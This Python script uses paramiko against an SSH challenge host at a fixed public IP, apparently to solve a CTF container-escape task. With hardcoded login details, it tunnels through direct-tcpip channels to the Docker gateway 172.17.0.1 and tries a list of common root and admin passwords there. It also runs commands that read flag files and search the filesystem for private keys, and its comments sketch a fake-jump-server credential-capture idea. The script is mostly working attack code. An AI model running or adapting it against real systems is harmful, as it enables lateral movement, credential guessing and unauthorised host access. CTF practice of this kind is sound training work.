import paramiko
import socket
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd_via_channel(transport, cmd, timeout=10):
    """通过transport执行命令"""
    try:
        session = transport.open_session()
        session.exec_command(cmd)
        session.settimeout(timeout)
        
        out = b""
        try:
            while True:
                chunk = session.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        
        return out.decode()
    except Exception as e:
        return f"Error: {e}"

def test_connection_info():
    """测试连接信息"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查SSH连接信息...")
    
    # 在第一层检查
    print("\n第一层连接信息:")
    print(exec_cmd_via_channel(transport, "printenv"))
    
    # 连接到127.0.0.1:22（也是dropbear）并检查
    channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('192.168.1.1', 12345))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    target_transport.auth_password(USER, PASSWD)
    
    print("\n第二层连接信息:")
    print(exec_cmd_via_channel(target_transport, "printenv"))
    
    target_transport.close()
    ssh.close()

def analyze_real_target_connection():
    """
    分析到真实目标172.17.0.1的连接
    
    既然host key不同，说明dropbear确实在转发到172.17.0.1
    问题是：如何获得172.17.0.1的凭据？
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 分析172.17.0.1...")
    
    # 连接到172.17.0.1
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    
    # 获取banner
    banner = channel.recv(1024)
    print(f"Banner: {banner.decode()}")
    
    channel.close()
    
    # 重新连接进行SSH握手
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 获取服务器信息
    key = target_transport.get_remote_server_key()
    print(f"Host key type: {key.get_name()}")
    print(f"Host key fingerprint: {key.get_fingerprint().hex()}")
    
    # 检查banner信息
    print(f"Remote version: {target_transport.remote_version}")
    
    # 尝试一些常见的凭据
    common_creds = [
        ("root", ""),
        ("root", "root"),
        ("root", "toor"),
        ("root", "password"),
        ("root", "123456"),
        ("ubuntu", "ubuntu"),
        ("admin", "admin"),
        ("ctf", "ctf"),
        ("flag", "flag"),
    ]
    
    target_transport.close()
    
    print("\n[*] 尝试常见凭据...")
    for user, passwd in common_creds:
        try:
            channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
            t = paramiko.Transport(channel)
            t.start_client()
            t.auth_password(user, passwd)
            print(f"[+] 成功: {user}:{passwd}")
            
            # 执行命令获取flag
            result = exec_cmd_via_channel(t, "id; hostname; cat /flag*")
            print(f"    输出: {result}")
            
            t.close()
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"[-] {user}:{passwd} - {e}")
    
    ssh.close()

def search_for_credentials():
    """
    在容器中搜索可能的凭据
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 搜索凭据...")
    
    # 检查环境变量
    result = exec_cmd_via_channel(transport, "printenv")
    print(f"环境变量:\n{result}")
    
    # 检查home目录
    result = exec_cmd_via_channel(transport, "ls -la ~")
    print(f"\nHome目录:\n{result}")
    
    # 检查SSH相关文件
    for path in ["/root/.ssh", "/etc/ssh", "/etc/dropbear"]:
        result = exec_cmd_via_channel(transport, f"ls -la {path}")
        print(f"\n{path}:\n{result}")
    
    # 搜索密钥文件
    result = exec_cmd_via_channel(transport, "find / -name '*.pem' -o -name '*_key' -o -name '*.key'")
    print(f"\n密钥文件:\n{result}")
    
    ssh.close()

def test_key_authentication():
    """
    测试是否可以用密钥认证
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试密钥认证到172.17.0.1...")
    
    # 生成一个测试密钥
    from paramiko import RSAKey
    test_key = RSAKey.generate(2048)
    
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 尝试用我们的密钥认证
    try:
        target_transport.auth_publickey("root", test_key)
        print("[+] 公钥认证成功!")
    except paramiko.AuthenticationException as e:
        print(f"[-] 公钥认证失败: {e}")
    
    target_transport.close()
    ssh.close()

def analyze_network_topology():
    """
    分析网络拓扑
    """
    
    print("[*] 网络拓扑分析:")
    print("""
    已知信息:
    1. 外部IP: 61.147.171.105:55300 (dropbear)
    2. dropbear为每个连接创建systemd-nspawn容器
    3. 容器内没有网络接口(DOWN状态)
    4. 但通过direct-tcpip可以访问:
       - 127.0.0.1:22 (dropbear) -> 创建新容器
       - 10.0.2.2:22 (dropbear)  
       - 10.0.2.15:22 (dropbear)
       - 172.17.0.1:22 (OpenSSH/Ubuntu) <- 真实宿主机!
    
    拓扑:
    
    Internet
        |
    [61.147.171.105] - Docker宿主机?
        |
    [dropbear] - 运行在容器外
        |
    +---+---+---+
    |   |   |   |
    容器1 容器2 容器3 ...  (systemd-nspawn)
    
    172.17.0.1 是Docker网络的网关，即真实宿主机
    
    关键问题：如何获取172.17.0.1的访问凭据？
    """)

def explore_ssh_options():
    """
    探索SSH选项
    
    题目说"使用SSH的某些特性"，让我们看看有哪些特性可用
    """
    
    print("[*] SSH特性分析:")
    print("""
    SSH特性列表:
    1. 端口转发 (Local/Remote/Dynamic) - 已测试，可用
    2. Agent转发 - 可能可用
    3. X11转发 - 不可用
    4. ProxyJump/ProxyCommand - 关键!
    5. 多路复用
    6. 子系统
    
    ProxyJump分析:
    - 当使用 ssh -J jump_host target 时
    - 客户端首先连接到 jump_host
    - 然后请求 jump_host 建立到 target 的 direct-tcpip 通道
    - 客户端通过该通道与 target 进行SSH握手
    
    问题：jump_host可以劫持这个过程吗？
    
    FakeJumpServer攻击：
    - 恶意跳板机伪造目标服务器的响应
    - 客户端发送凭据时，跳板机捕获
    
    但在这个题目中，我们是想要逃逸，不是捕获凭据...
    
    新思路：
    - 如果dropbear有某种"后门"或特殊配置
    - 允许某些用户或在某些条件下直接连接到宿主机
    - 或者允许访问某些特殊资源
    """)

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入分析")
    print("="*60)
    
    print("\n[1] 测试连接信息")
    test_connection_info()
    
    print("\n[2] 分析网络拓扑")
    analyze_network_topology()
    
    print("\n[3] 探索SSH选项")
    explore_ssh_options()
    
    print("\n[4] 搜索凭据")
    search_for_credentials()
    
    print("\n[5] 分析到172.17.0.1的连接")
    analyze_real_target_connection()
